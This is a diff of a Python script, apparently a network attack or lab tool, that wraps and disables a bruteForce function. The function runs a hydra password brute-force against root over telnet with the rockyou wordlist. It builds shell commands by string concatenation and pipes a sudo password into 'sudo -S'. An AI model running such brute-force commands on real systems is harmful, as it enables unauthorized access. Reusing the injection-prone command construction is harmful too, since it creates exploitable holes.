@@ -52,20 +52,21 @@ def scanning(ip):
     os.system(command)
 
 #end scanning
+"""
 def bruteForce(ip, pwdFile, pwd):
-    """
-    This method performs a brute force attack on the specified ip address.
-        Parameters:
-        ip: <string> ip address to attack
-        pwdFile: <string> name of file, complete with .txt, of passwords to perform attack with
-        pwd: <string> sudo password for machine running attack
-    """
+    
+    #This method performs a brute force attack on the specified ip address.
+       # Parameters:
+      #  ip: <string> ip address to attack
+     #   pwdFile: <string> name of file, complete with .txt, of passwords to perform attack with
+    #    pwd: <string> sudo password for machine running attack
+    
       
     command = 'hydra -l root -P rockyou.txt telnet://' + ip
     os.system('echo %s|sudo -S %s' % (str(pwd), command))
 
 #end bruteForce
-
+"""
 def avacomCommand(ip, command):
     #depricated version of avacomPing
     """
